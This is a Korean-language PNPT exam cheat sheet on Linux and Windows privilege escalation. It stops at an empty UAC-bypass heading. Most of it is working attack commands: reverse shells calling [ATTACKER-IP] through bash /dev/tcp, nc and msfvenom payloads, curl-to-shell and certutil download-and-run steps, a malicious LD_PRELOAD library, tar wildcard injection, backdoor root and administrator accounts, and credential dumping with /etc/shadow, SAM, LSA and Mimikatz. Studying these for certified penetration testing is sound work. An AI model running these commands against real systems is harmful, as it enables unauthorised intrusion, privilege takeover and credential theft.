이 글은 TCM Security의 PNPT(Practical Network Penetration Tester) 자격증 취득을 위한 권한 상승 기법 치트시트 이다

Linux는 파일 시스템과 권한 모델 기반 기법을 쓰지만 Windows는 고유 구조 기반 기법을 쓰기 때문에 이번 글에선 파트를 두개로 나누어 설명 하도록 하겠다

또한 실제 시험과 현업 침투 테스트에서 사용되는 흐름 그대로 단계별로 정리하였다

## PART 1 : LINUX PRIVILEGE ESCALATION

### [Linux PrivEsc 공격 흐름]

Linux 권한 상승에서는 현재 사용자의 권한 범위를 파악하고 설정 오류나 취약점을 찾아 root 권한을 획득하는것이 목표이다

```less
[일반 사용자 쉘 획득]

1단계. 자동 열거
  LinPEAS, LinEnum, pspy로 공격 표면 전체 파악

[취약한 설정, SUID 바이너리, 크론 잡, 패스워드 위치 파악]

2단계. sudo 설정 확인 (가장 먼저!)
  sudo -l로 패스워드 없이 실행 가능한 명령 확인
  GTFOBins 연동으로 즉시 root 셸 획득

3단계. SUID 바이너리 탐색
  find로 SUID 바이너리 목록 수집
  GTFOBins에서 익스플로잇 방법 확인

4단계. Cron Job 확인
  쓰기 가능한 스크립트, 와일드카드, PATH 조작으로 root 코드 실행

5단계. 패스워드 탐색
  bash_history, 설정 파일, /etc/shadow에서 자격증명 수집

6단계. 기타 벡터
  NFS, 커널 익스플로잇, Docker/LXC 그룹 등

[root 획득 → 스크린샷 → 보고서]
```

※시험에서는 복잡한 커널 익스플로잇보다 sudo 설정 오류나 SUID가 훨씬 자주 등장한다

### 

### [1단계 : 자동 열거]

자동 열거 단계에선 수백 가지 권한 상승 벡터를 한 번에 점검하는것이 목표이다

### [1-1 : LinPEAS]

LinPEAS는 Linux 권한 상승을 위한 가장 포괄적인 자동 열거 스크립트이다

결과를 색상으로 분류하여 빨간색/노란색 항목이 핵심 공격 벡터이다

**사용 조건:**

```
1.타겟 머신에 쉘 접근 보유
2.인터넷 접근 또는 공격자 머신 HTTP 서버 필요
```

**공격 흐름 + 툴 & 명령어:**

```perl
(공격 흐름)

1.공격자 머신에서 HTTP 서버 실행
2.타겟에서 LinPEAS 다운로드 후 실행
3.Red/Yellow 항목 위주로 분석
4.발견된 벡터로 권한 상승 시도

--------------------------------------------------------------

(공격자 머신 - HTTP 서버)

python3 -m http.server 80

--------------------------------------------------------------

(타겟 머신 - 다운로드 및 실행)

wget http://[ATTACKER-IP]/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# 출력 저장
./linpeas.sh | tee linpeas_output.txt

# 디스크 미접촉 실행 (파일 안 남김)
curl http://[ATTACKER-IP]/linpeas.sh | sh

# 옵션
./linpeas.sh -a    # 집중 스캔 포함 전체 검사
```

※**Red/Yellow** 항목 = 95~99% 확률로 권한 상승 벡터이기 때문에 반드시 수동 검증이 필요하다

### [1-2 : pspy — 숨겨진 크론 탐지]

pspy는 root 권한 없이 실행 중인 모든 프로세스와 크론 잡을 실시간으로 모니터링하는 도구이다

/etc/crontab에 보이지 않는 숨겨진 크론 잡을 탐지할 수 있다

**사용 조건:**

```
1.타겟 머신에 쉘 접근 보유
```

**공격 흐름 + 명령어:**

```perl
(공격 흐름)

1.pspy64 다운로드 후 실행
2.UID=0(root)으로 실행되는 프로세스 모니터링
3.주기적으로 실행되는 스크립트 발견
4.해당 스크립트 쓰기 권한 확인 → Cron Job 공격

--------------------------------------------------------------

(명령어)

wget http://[ATTACKER-IP]/pspy64
chmod +x pspy64
./pspy64                          # 기본 실행
./pspy64 -pf -i 1000              # 파일시스템 이벤트 포함, 1초 간격
```

### [1-3 : 수동 열거 필수 명령어]

앞서 설명한 자동화 도구와는 다르게 수동 열거는 쉘을 따낸 직후 권한 상승 벡터들을 찾기 위해 실행한다

```bash
# 현재 사용자 권한 (가장 먼저!)
whoami && id
sudo -l                              # 핵심! NOPASSWD 항목 즉시 확인

# SUID 파일 찾기 (권한 상승 핵심 벡터)
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# 크론잡 확인 (예약 작업 악용)
cat /etc/crontab
ls -la /etc/cron*
cat /var/spool/cron/crontabs/root 2>/dev/null

# 시스템 정보
uname -a                             # 커널 버전 (고난도 커널 익스플로잇 탐색용)
cat /etc/issue && cat /etc/os-release
hostname

# 사용자 목록
cat /etc/passwd
cat /etc/shadow                      # 읽기 가능하면 즉시 크래킹

# 쓰기 가능한 디렉토리/파일
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null | grep -v proc

# 환경변수 (PATH 하이재킹용)
env
echo $PATH

# 네트워크
ifconfig && ip route
ss -tulnp                            # netstat 대신 ss 권장 (-ano는 Windows 옵션)

# 실행 중인 프로세스
ps aux | grep root
```

### [2단계 : sudo 설정 오류]

sudo 설정 오류 단계에선 sudo -l로 확인된 허용 명령어로 root 셸을 획득하는것이 목표이다

sudo 설정 오류는 PNPT 시험에서 가장 자주 등장하는 권한 상승 벡터이다

### [2-1 : GTFOBins 연동 — sudo 셸 탈출]

sudo -l실행 시 NOPASSWD 항목이 존재한다면 GTFOBins(명령어 모음집)를 통해 해당 명령어로 루트 권한 획득이 가능하다

※보통 NODPASSWD는 /etc/sudoers에 위치해 있으며 NOPASSWD는 sudo 검증 자체를 없애버리기 때문에  루트 권한 획득이 가능해진다

**사용 조건:**

```less
1.sudo -l 결과에 허용된 명령 존재
2.GTFOBins(https://gtfobins.github.io) 접근
```

**공격 흐름 + 명령어:**

```python
(공격 흐름)

1.sudo -l 실행 → 허용된 명령 확인
2.GTFOBins에서 해당 바이너리 검색
3.Sudo 섹션 명령어 그대로 실행 → root 셸

--------------------------------------------------------------

(sudo -l 예시 출력 해석)

# Defaults env_keep+=LD_PRELOAD   ← LD_PRELOAD 공격 가능
# (root) NOPASSWD: /usr/bin/find  ← 패스워드 없이 root로 find 실행 가능
# (ALL, !root) /bin/bash          ← CVE-2019-14287 대상

--------------------------------------------------------------

(GTFOBins — Sudo 섹션 주요 바이너리)

sudo find . -exec /bin/sh \; -quit
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo vim -c ':!/bin/bash'
sudo awk 'BEGIN {system("/bin/bash")}'
sudo env /bin/bash
sudo perl -e 'exec "/bin/bash";'
sudo less /etc/passwd  →  !/bin/bash          # less 내부에서 ! 입력
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

### [2-2 : LD_PRELOAD 공격]

sudo -l에서 env_keep+=LD_PRELOAD가 보이면 어떤 sudo 허용 바이너리 (실행 가능한 프로그램 파일) 든 root 셸을 얻을 수 있다

※ LD_PRELOAD는 프로그램 실행 전 사용자가 지정한 라이브러리를 먼저 로드하는 환경변수로, /etc/sudoers에 Defaults env_keep+=LD_PRELOAD 설정이 존재할 경우 sudo 실행 시에도 해당 환경변수가 유지되어 악성 라이브러리를 root 권한으로 로드할 수 있다

**사용 조건:**

```bash
1.sudo -l 결과에 env_keep+=LD_PRELOAD 항목 존재
2.최소 하나의 sudo NOPASSWD 명령 존재(NOPASSWD가 있어야 sudo 실행 가능)
```

**공격 흐름 + 명령어:**

```objectivec
(공격 흐름)

1.악성 공유 오브젝트(.so) 파일 작성
2.gcc로 컴파일
3.LD_PRELOAD 환경변수로 악성 .so 로드하여 sudo 명령 실행
4.root 셸 획득

--------------------------------------------------------------

(명령어)

# 악성 .so 작성 및 컴파일
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles

# 실행 (아무 sudo 허용 명령이나 사용)
sudo LD_PRELOAD=/tmp/shell.so find
sudo LD_PRELOAD=/tmp/shell.so apache2
```

### [3단계 : SUID/SGID 바이너리]

SUID 단계에선 root 소유이면서 SUID 비트가 설정된 바이너리로 root 셸을 획득하는것이 목표이다

SUID 비트가 설정된 바이너리는 누구든 파일 소유자(주로 root)의 권한으로 실행한다

### [3-1 : SUID 탐색 및 GTFOBins 연동]

**사용 조건:**

```
1.타겟 머신에 쉘 접근 보유
2.GTFOBins 접근
```

**공격 흐름 + 명령어:**

```python
(공격 흐름)

1.find로 SUID 바이너리 목록 수집
2.기본 시스템 바이너리(su, passwd, mount, ping) 제외
3.비표준 바이너리를 GTFOBins에서 검색 → SUID 섹션 확인
4.명령어 실행 → root 셸

--------------------------------------------------------------

(SUID 탐색)

find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f -ls 2>/dev/null    # 상세 정보
find / -perm /6000 -type f 2>/dev/null        # SUID + SGID

--------------------------------------------------------------

(GTFOBins — SUID 섹션 주요 바이너리)

# bash
bash -p                                        # -p: effective UID 유지 → root

# find
find . -exec /bin/sh -p \; -quit

# python
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# env
env /bin/sh -p

# nmap (구버전 2.02-5.21)
nmap --interactive
!sh
```

### [3-2 : PATH 하이재킹 — SUID 바이너리가 절대경로 없이 명령 호출 시]

SUID 바이너리가 system("ps") 처럼 절대경로 없이 명령을 호출하면 PATH를 조작해 악성 바이너리를 먼저 실행시킨다

**사용 조건:**

```
1.SUID 바이너리가 절대경로 없이 명령 호출
2.strings/ltrace/strace로 호출 명령 확인 가능
```

**공격 흐름 + 명령어:**

```bash
(공격 흐름)

1.strings로 SUID 바이너리가 호출하는 명령어 확인
2.호출 명령 이름으로 악성 스크립트 생성
3.PATH에 악성 스크립트 디렉토리를 앞에 추가
4.SUID 바이너리 실행 → 악성 스크립트 root로 실행

--------------------------------------------------------------

(명령어)

# SUID 바이너리 분석
strings /path/to/suid_binary
ltrace /path/to/suid_binary                   # 라이브러리 호출 추적

# "ps"를 절대경로 없이 호출하는 경우
cd /tmp
echo '/bin/bash -p' > ps && chmod +x ps
export PATH=/tmp:$PATH
/path/to/suid_binary                           # /tmp/ps 실행 → root 셸
```

### [4단계 : Cron Job 악용]

Cron Job 단계에선 root가 실행하는 예약 작업의 설정 오류를 이용해 root 권한으로 코드를 실행하는것이 목표이다

### [4-1 : 쓰기 가능한 크론 스크립트]

**사용 조건:**

```
1.root 크론 잡이 실행하는 스크립트에 쓰기 권한 존재
```

**공격 흐름 + 명령어:**

```bash
(공격 흐름)

1.크론탭 확인 → root가 실행하는 스크립트 파악
2.해당 스크립트 쓰기 권한 확인
3.리버스 셸 또는 SUID bash 코드 삽입
4.크론 실행 대기 → root 획득

--------------------------------------------------------------

(크론탭 열거)

cat /etc/crontab
ls -la /etc/cron*
./pspy64                           # 숨겨진 크론 탐지 필수

--------------------------------------------------------------

(명령어)

# 쓰기 권한 확인
ls -la /opt/scripts/cleanup.sh    # -rwxrwxrwx 이면 악용 가능

# 리버스 셸 삽입
echo '#!/bin/bash' > /opt/scripts/cleanup.sh
echo 'bash -i >& /dev/tcp/[ATTACKER-IP]/4444 0>&1' >> /opt/scripts/cleanup.sh

# 또는 SUID bash 생성
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/scripts/cleanup.sh
# 크론 실행 후: /tmp/rootbash -p
```

### [4-2 : tar 와일드카드 인젝션]

크론 잡에서 tar *를 사용할 때 파일명이 tar 옵션으로 해석되는 점을 악용한다

**사용 조건:**

```
1./etc/crontab에서 tar * 형태의 명령 존재
2.해당 디렉토리에 파일 생성 권한 존재
```

**공격 흐름 + 명령어:**

```bash
(공격 흐름)

1.크론탭에서 tar * 사용 확인
2.해당 디렉토리에 악성 파일 생성
3.파일명이 tar 옵션으로 해석됨
4.크론 실행 → root로 리버스 셸 실행

--------------------------------------------------------------

(명령어)

# /etc/crontab: * * * * * root cd /home/user && tar -cf /tmp/backup.tar *

# 리버스 셸 스크립트 생성
echo '#!/bin/bash' > /home/user/shell.sh
echo 'bash -i >& /dev/tcp/[ATTACKER-IP]/4444 0>&1' >> /home/user/shell.sh
chmod +x /home/user/shell.sh

# 파일명이 tar 옵션이 되도록 생성
echo "" > "/home/user/--checkpoint=1"
echo "" > "/home/user/--checkpoint-action=exec=sh shell.sh"

# 결과: tar ... --checkpoint=1 --checkpoint-action=exec=sh shell.sh
```

### 

### [5단계 : 패스워드 및 자격증명 탐색]

패스워드 탐색 단계에선 시스템 전체에서 평문 패스워드와 해시를 수집하는것이 목표이다

패스워드 재사용이 매우 흔하므로 하나만 찾아도 전체 시스템을 장악할 수 있다

**공격 흐름 + 명령어:**

```coffeescript
(공격 흐름)

1.bash_history에서 패스워드 포함 명령어 확인
2.설정 파일에서 DB/서비스 자격증명 탐색
3./etc/shadow 읽기 가능 시 오프라인 크래킹
4.발견된 패스워드로 su root 또는 sudo 시도

--------------------------------------------------------------

(명령어)

# 히스토리 파일
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null
grep -i "password\|passwd\|pass" ~/.bash_history

# 설정 파일 패스워드 탐색
grep -ri "password" /etc/ /opt/ /var/www/ 2>/dev/null
find / -name "wp-config.php" 2>/dev/null       # WordPress DB 패스워드
find / -name "*.env" -o -name "*.conf" 2>/dev/null
find / -name "id_rsa" 2>/dev/null              # SSH 개인키

# /etc/shadow 크래킹
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
hashcat -m 1800 -a 0 shadow_hashes.txt rockyou.txt

# /etc/passwd 쓰기 가능 시 root 사용자 직접 추가
openssl passwd -1 -salt hacker password123
echo 'hacker:[생성된 해시]:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

### [6단계 : 기타 벡터]

### [6-1 : NFS no_root_squash]

NFS 공유에서 no_root_squash가 설정되면 공격자 머신의 root가 공유 폴더에서도 root 권한을 유지한다

**사용 조건:**

```coffeescript
1.타겟에 NFS 서비스 실행 중
2./etc/exports에 no_root_squash 설정 존재
3.공격자 머신 root 권한 보유
```

**공격 흐름 + 명령어:**

```perl
(공격 흐름)

1.showmount으로 NFS 공유 확인
2.no_root_squash 설정 확인
3.공격자 머신에서 root로 마운트
4.SUID 바이너리 생성 → 타겟에서 실행

--------------------------------------------------------------

(명령어)

# 열거
showmount -e [TARGET-IP]
cat /etc/exports                              # no_root_squash 확인

# 공격자 머신에서 마운트 (root로)
mkdir /tmp/nfsdir
sudo mount -o rw,vers=3 [TARGET-IP]:/share /tmp/nfsdir

# SUID bash 생성
cp /bin/bash /tmp/nfsdir/
sudo chown root:root /tmp/nfsdir/bash
sudo chmod +s /tmp/nfsdir/bash

# 타겟에서 실행
cd /share && ./bash -p
```

### [6-2 : 커널 익스플로잇]

커널 취약점은 어떤 권한에서든 즉시 root를 획득하지만 시스템 크래시 위험이 있어 마지막에 시도한다

**※**운영체제의 핵심 부분으로 하드웨어와 프로그램 사이를 연결하는 중간 관리자

**사용 조건:**

```
1.취약한 커널 버전 확인
2.searchsploit 또는 linux-exploit-suggester 결과
```

**공격 흐름 + 명령어:**

```perl
(공격 흐름)

1.uname -a로 커널 버전 확인
2.linux-exploit-suggester로 취약 익스플로잇 목록 확인
3.searchsploit으로 익스플로잇 코드 복사
4.타겟에서 컴파일 후 실행

--------------------------------------------------------------

(명령어)

uname -a
./linux-exploit-suggester.sh
searchsploit linux kernel 5.4 privilege escalation

# DirtyCow (CVE-2016-5195) — 커널 2.6.22 ~ 3.9
searchsploit -m linux/local/40839.c
gcc -pthread 40839.c -o dirty -lcrypt
./dirty my-new-password
su firefart

# PwnKit (CVE-2021-4034) — Polkit, 거의 모든 배포판
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x PwnKit && ./PwnKit
```

※ 타겟 머신에 gcc(컴파일러)가 없는 경우 공격자 머신에서 미리 컴파일한 실행파일을 전송한다 이때 -static 옵션을 사용하면 필요한 코드를 실행파일 안에 모두 포함시켜 타겟 환경에 관계없이 실행 가능하다

### [6-3 : Docker 그룹]

docker 그룹에 소속된 사용자는 호스트 파일시스템 전체에 root로 접근 가능하다

**사용 조건:**

```go
1.id 명령 결과에 docker 그룹 포함
```

**공격 흐름 + 명령어:**

```ruby
(명령어)

id                                            # docker 그룹 확인

# 호스트 파일시스템 마운트 → root 셸
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## PART 2 : WINDOWS PRIVILEGE ESCALATION

### [Windows PrivEsc 공격 흐름]

Windows 권한 상승에서는 서비스, 레지스트리, 토큰, 파일 권한의 설정 오류를 이용해 SYSTEM 권한을 획득하는것이 목표이다

```less
[일반 사용자 쉘 획득]

1단계. 자동 열거
  WinPEAS, PowerUp으로 공격 표면 전체 파악

[SeImpersonatePrivilege, 서비스 오류, 레지스트리 취약점, 패스워드 위치 파악]

2단계. SeImpersonatePrivilege 확인 (가장 먼저!)
  whoami /priv에서 확인
  Potato 계열 공격으로 SYSTEM 즉시 획득

3단계. 서비스 설정 오류
  Unquoted Service Path, 취약한 권한, binpath 변경

4단계. 레지스트리 익스플로잇
  AlwaysInstallElevated, AutoRun, 저장된 자격증명

5단계. 패스워드 탐색
  SAM 덤프, LSA Secrets, 설정 파일, PowerShell 히스토리

6단계. 기타 벡터
  DLL 하이재킹, UAC 우회, 예약 작업

[SYSTEM 획득 → 스크린샷 → 보고서]
```

※IIS, MSSQL 서비스 계정으로 쉘을 얻으면 SeImpersonatePrivilege가 있을 가능성이 매우 높다

### [1단계 : 자동 열거]

자동 열거 단계에선 WinPEAS와 PowerUp으로 수십 가지 권한 상승 벡터를 한 번에 파악하는것이 목표이다

### [1-1 : WinPEAS]

WinPEAS는 Windows 권한 상승과 관련된 거의 모든 벡터를 커버하는 가장 포괄적인 자동 열거 도구이다

**사용 조건:**

```
1.타겟 Windows 머신에 쉘 접근 보유
```

**공격 흐름 + 명령어:**

```csharp
(공격 흐름)

1.공격자 머신에서 WinPEAS 다운로드 준비
2.타겟에 전송
3.색상 출력 활성화 후 실행
4.Red 항목 위주로 분석

--------------------------------------------------------------

(타겟 전송)

certutil -urlcache -f http://[ATTACKER-IP]/winPEASx64.exe winpeas.exe
powershell iwr -Uri http://[ATTACKER-IP]/winPEASx64.exe -OutFile winpeas.exe

--------------------------------------------------------------

(명령어)

# 색상 출력 활성화 (먼저 실행!)
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1

.\winpeas.exe                 # 전체 검사
.\winpeas.exe quiet           # 간략 출력
.\winpeas.exe systeminfo      # 특정 모듈만
.\winpeas.exe servicesinfo
.\winpeas.exe windowscreds
```

### [1-2 : PowerUp.ps1]

PowerUp.ps1은 발견된 취약점에 대해 AbuseFunction을 직접 제공하여 원클릭 익스플로잇이 가능한 열거 도구이다

**사용 조건:**

```css
1.PowerShell 실행 가능
2.PowerUp.ps1 보유 (PowerSploit)
```

**공격 흐름 + 명령어:**

```visual-basic
(명령어)

powershell -ep bypass
. .\PowerUp.ps1

Invoke-AllChecks                              # 전체 검사 + AbuseFunction

# 개별 함수
Get-UnquotedService                           # 인용부호 없는 서비스 경로
Get-ModifiableServiceFile                     # 쓰기 가능한 서비스 바이너리
Get-ModifiableService                         # 약한 권한의 서비스
Find-ProcessDLLHijack                         # DLL 하이재킹 기회

# 자동 익스플로잇
Invoke-ServiceAbuse -Name 'VulnSvc'
```

### [1-3 : 수동 열거 필수 명령어]

Linux와 같이 Windows 또한 쉘을 따낸 직후 권한 상승 벡터를 찾기 위해 수동 열거를 실행한

```bash
# 현재 권한 (가장 먼저 - SeImpersonatePrivilege 확인)
whoami /priv
whoami /all

# 시스템 정보
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Hotfix(s)"

# 사용자 정보
net user
net localgroup administrators

# 실행 중인 서비스
sc query
net start

# 실행 중인 프로세스
tasklist /v

# 네트워크
ipconfig /all
netstat -ano

# 저장된 크리덴셜
cmdkey /list

# 레지스트리 패스워드 탐색
reg query HKLM /f password /t REG_SZ /s

# AV 상태
sc query windefend
```

### [2단계 : Potato 계열 공격 — SeImpersonatePrivilege 악용]

Potato 단계에선 SeImpersonatePrivilege 권한으로 SYSTEM 토큰을 탈취하는것이 목표이다

IIS, MSSQL, WCF 등 서비스 계정에는 SeImpersonatePrivilege가 기본 부여되어 있어 서비스 계정 쉘 획득 시 즉시 SYSTEM으로 상승 가능하다

**사용 조건:**

```rust
1.whoami /priv에서 SeImpersonatePrivilege 또는 SeAssignPrimaryTokenPrivilege 확인
```

**Potato 도구 선택 기준:**

```yaml
(Potato 도구 선택 기준)

PrintSpoofer  → Windows 10 1607+, Server 2016/2019 (가장 간단, 먼저 시도)
GodPotato     → Windows 8~11, Server 2012~2022 (가장 넓은 호환성)
JuicyPotato   → Windows 7~10 ≤1803, Server 2008~2016 (CLSID 필요)
RoguePotato   → Windows 10 1809+, Server 2019+ (공격자 포트 135 필요)
```

**공격 흐름 + 명령어:**

```swift
(공격 흐름)

1.whoami /priv로 SeImpersonatePrivilege 확인
2.systeminfo로 Windows 버전 확인
3.PrintSpoofer 먼저 시도 → 실패 시 GodPotato → JuicyPotato 순서
4.SYSTEM 셸 획득

--------------------------------------------------------------

(PrintSpoofer — 가장 간단)

PrintSpoofer.exe -i -c cmd                    # 대화형 SYSTEM 셸
PrintSpoofer.exe -c "C:\temp\reverse.exe"     # 리버스 셸 실행

--------------------------------------------------------------

(GodPotato — 가장 넓은 호환성)

GodPotato-NET4.exe -cmd "cmd /c C:\temp\nc.exe [ATTACKER-IP] 4444 -e cmd"
GodPotato-NET4.exe -cmd "cmd /c whoami > C:\temp\result.txt"

--------------------------------------------------------------

(JuicyPotato — 구버전 Windows)

JuicyPotato.exe -l 1337 -p C:\temp\reverse.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}

# CLSID는 Windows 버전별로 다름
# https://github.com/ohpe/juicy-potato/tree/master/CLSID 참고
```

### [3단계 : 서비스 설정 오류]

서비스 설정 오류 단계에선 Windows 서비스의 경로 오류나 약한 권한을 이용해 SYSTEM으로 상승하는것이 목표이다

### [3-1 : Unquoted Service Path (인용부호 없는 서비스 경로)]

서비스 경로에 공백이 있고 따옴표가 없으면 Windows는 경로를 순서대로 시도한다

C:\Program Files\Vuln Service\binary.exe → C:\Program.exe → C:\Program Files\Vuln.exe 순으로 탐색하므로 쓰기 가능한 경로에 악성 파일을 배치한다

**사용 조건:**

```
1.공백 포함 + 따옴표 없는 서비스 경로 존재
2.경로 내 디렉토리에 쓰기 권한 존재
```

**공격 흐름 + 명령어:**

```csharp
(공격 흐름)

1.인용부호 없는 서비스 경로 탐색
2.경로 중 쓰기 가능한 디렉토리 확인
3.악성 실행 파일 배치
4.서비스 재시작 → SYSTEM으로 악성 파일 실행

--------------------------------------------------------------

(명령어)

# 취약한 서비스 탐색
wmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """"

# 특정 서비스 확인
sc qc VulnService

# 디렉토리 쓰기 권한 확인
icacls "C:\Program Files\Vuln Service"        # (F), (M), (W) 항목 확인
accesschk64.exe /accepteula -wvu "C:\Program Files\Vuln Service"

# 페이로드 생성 (공격자)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER-IP] LPORT=4444 -f exe -o Vuln.exe

# 배치 및 서비스 재시작
copy Vuln.exe "C:\Program Files\Vuln.exe"
sc stop VulnService && sc start VulnService
```

### [3-2 : 약한 서비스 권한 (binpath 변경)]

서비스 자체에 SERVICE_CHANGE_CONFIG 권한이 있으면 실행 파일 경로를 악성 경로로 변경한다

※ SERVICE_CHANGE_CONFIG = 서비스 설정 수정 권한으로 경로 변경이 가능하기 때문에 악성 파일을 실행하여 권한 상승이 가능해진다

**사용 조건:**

```
1.서비스에 SERVICE_CHANGE_CONFIG 이상의 권한 존재
```

**공격 흐름 + 명령어:**

```sql
(공격 흐름)

1.accesschk으로 서비스 권한 확인
2.SERVICE_ALL_ACCESS 또는 SERVICE_CHANGE_CONFIG 확인
3.binpath를 악성 실행 파일로 변경
4.서비스 재시작 → SYSTEM으로 악성 파일 실행

--------------------------------------------------------------

(명령어)

# 서비스 권한 확인
accesschk64.exe /accepteula -uwcqv "Users" *
accesschk64.exe /accepteula -wuvc VulnService

# binpath 변경
sc config VulnService binpath= "C:\temp\reverse.exe"
sc stop VulnService && sc start VulnService

# 관리자 추가
sc config VulnService binpath= "net localgroup administrators hacker /add"
sc stop VulnService && sc start VulnService
```

### [4단계 : 레지스트리 익스플로잇]

레지스트리 단계에선 잘못된 레지스트리 설정으로 높은 권한의 코드 실행을 유도하는것이 목표이다

### [4-1 : AlwaysInstallElevated]

HKLM과 HKCU 모두에서 AlwaysInstallElevated 값이 0x1(활성화)이면 일반 유저가 실행한 MSI파일도 SYSTEM 권한으로 설치되기 떄문에 악성 MSI를 통한 권한 상승이 가능하다

※HKLM = 시스템 전체 레지스트리 설정

※HKCU = 현재 유저 레지스트리 설정

**사용 조건:**

```
1.HKLM과 HKCU 모두에서 AlwaysInstallElevated = 0x1
```

**공격 흐름 + 명령어:**

```bash
(공격 흐름)

1.레지스트리 값 확인 (두 곳 모두 1이어야 함)
2.악성 MSI 생성
3.무음 설치 실행 → SYSTEM으로 페이로드 실행

--------------------------------------------------------------

(명령어)

# 레지스트리 확인
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 악성 MSI 생성 (공격자)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER-IP] LPORT=4444 -f msi -o shell.msi

# 타겟에서 실행
msiexec /quiet /qn /i shell.msi
```

### [4-2 : 레지스트리 저장 자격증명]

AutoLogon, AutoRun 설정, 저장된 패스워드가 레지스트리에 평문으로 남아있는 경우가 많다

※레지스트리 = Windows 설정값을 저장해놓는 데이터베이스

```
# AutoLogon 패스워드
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# 전체 레지스트리 패스워드 검색
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# 저장된 자격증명
cmdkey /list
runas /savecred /user:Administrator cmd.exe

# AutoRun 프로그램 쓰기 권한 확인
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
icacls "[AutoRun 바이너리 경로]"
```

### [5단계 : 패스워드 탐색]

패스워드 탐색 단계에선 Windows 시스템 전체에서 자격증명을 수집하는것이 목표이다

### [5-1 : SAM 덤프 — 로컬 계정 해시 추출]

SAM 데이터베이스에는 로컬 사용자 계정의 NTLM 해시가 저장되어 있다

**사용 조건:**

```sql
1.SYSTEM 또는 관리자 권한 보유
```

**공격 흐름 + 명령어:**

```bash
(공격 흐름)

1.SAM과 SYSTEM 파일 저장
2.공격자 머신으로 전송
3.secretsdump로 해시 추출
4.해시 크래킹 또는 Pass-the-Hash 공격

--------------------------------------------------------------

(타겟 - SAM/SYSTEM 저장)

reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY

# 공격자 머신 - 해시 추출 (Impacket)
secretsdump.py -sam SAM -system SYSTEM LOCAL
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

### [5-2 : Mimikatz — LSASS 메모리 덤프]

Mimikatz는 LSASS 메모리에서 평문 패스워드와 NTLM 해시를 추출하는 도구이다

**사용 조건:**

```sql
1.SYSTEM 또는 관리자 권한 보유
2.SeDebugPrivilege 권한 보유
```

**공격 흐름 + 명령어:**

```php
privilege::debug
token::elevate
sekurlsa::logonpasswords          # LSASS 메모리에서 평문/해시 덤프
lsadump::sam                      # SAM 데이터베이스 덤프
lsadump::secrets                  # LSA Secrets 덤프
```

### [5-3 : 파일 시스템 패스워드 탐색]

파일 시스템의 패스워드 탐색은 권한상승 없이도 관리자 계정으로 직접 접근이 가능하기 때문에 수동 열거와 동시에 진행한다

※관리자가 실수로 파일에 남겨둔 패스워드를 찾는 것이 목표이며 발견 시 권한 상승 과정의 생략이 가능해진다

```
# 파일 내 패스워드 검색
findstr /si password *.txt *.ini *.config *.xml
dir /s *pass* *cred* *vnc* *.config 2>nul

# PowerShell 히스토리 (핵심!)
type C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Unattend.xml (관리자 패스워드 포함 가능)
dir /s *sysprep.inf *unattend.xml 2>nul

# IIS web.config
type C:\inetpub\wwwroot\web.config | findstr -i "connectionstring password"

# WiFi 패스워드
netsh wlan show profiles
netsh wlan show profile <프로파일명> key=clear
```

### [6단계 : 기타 벡터]

### [6-1 : DLL 하이재킹]

높은 권한으로 실행되는 프로세스가 쓰기 가능한 경로에서 DLL을 로드하면 악성 DLL을 삽입할 수 있다

※프로세스 = 실행 중인 프로그램

※ DDL = 여러 프로그램이 공통적으로 쓰는 코드 모음 파일

**사용 조건:**

```
1.높은 권한으로 실행되는 프로세스 존재
2.해당 프로세스가 쓰기 가능한 경로의 DLL 로드
3.Procmon으로 NAME NOT FOUND DLL 탐지
```

**공격 흐름 + 명령어:**

```bash
(공격 흐름)

1.Procmon에서 NAME NOT FOUND + .dll 필터링
2.누락된 DLL 경로 쓰기 권한 확인
3.악성 DLL 생성 후 배치
4.서비스 재시작 → 높은 권한으로 악성 DLL 로드

--------------------------------------------------------------

(악성 DLL 생성)

# msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER-IP] LPORT=4444 -f dll -o hijack.dll

# 배치 및 서비스 재시작
copy hijack.dll "C:\target\directory\expected_dll.dll"
sc stop ServiceName && sc start ServiceName
```

### [6-2 : UAC 우회]

